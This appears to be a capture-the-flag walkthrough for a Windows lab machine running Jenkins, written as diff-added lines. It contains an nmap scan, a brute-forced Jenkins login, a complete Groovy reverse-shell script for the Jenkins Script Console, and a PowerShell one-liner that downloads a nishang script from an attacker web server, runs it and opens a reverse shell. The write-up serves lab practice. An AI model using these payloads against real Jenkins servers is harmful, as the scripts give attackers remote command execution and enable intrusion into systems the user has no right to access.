@@ -1,0 +1,38 @@
+I start off with an nmap scan. The machine does not respond to ICMP requests so decided to use the -Pn flag
+└─# nmap -sC -sV -Pn 10.10.85.204
+
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Site doesn't have a title (text/html).
+3389/tcp open  tcpwrapped
+| ssl-cert: Subject: commonName=alfred
+| Not valid before: 2021-12-20T07:43:00
+|_Not valid after:  2022-06-21T07:43:00
+|_ssl-date: 2021-12-21T07:44:49+00:00; +1m25s from scanner time.
+8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 1m24s
+
+### What is the username and password for the log in panel(in the format username:password)
+I visit the prot 8080 and bruteforce the login page. 
+After accessing the Jenkins dashboard, I head up to the Manage Jenkins > Script Console, enter a groovy reverse shell and Run
+
+String host="localhost";
+int port=4444;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+This would not work because the server is a windows. So i had to go with a nishang script:
+powershell iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x:8000/PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress x.x.x. -Port 4444
+
+Locally, I start a netcat listener and a web server to serve the powershell script.
+After a short moment, I receive a reverse shell and am able to retrieve user flag.
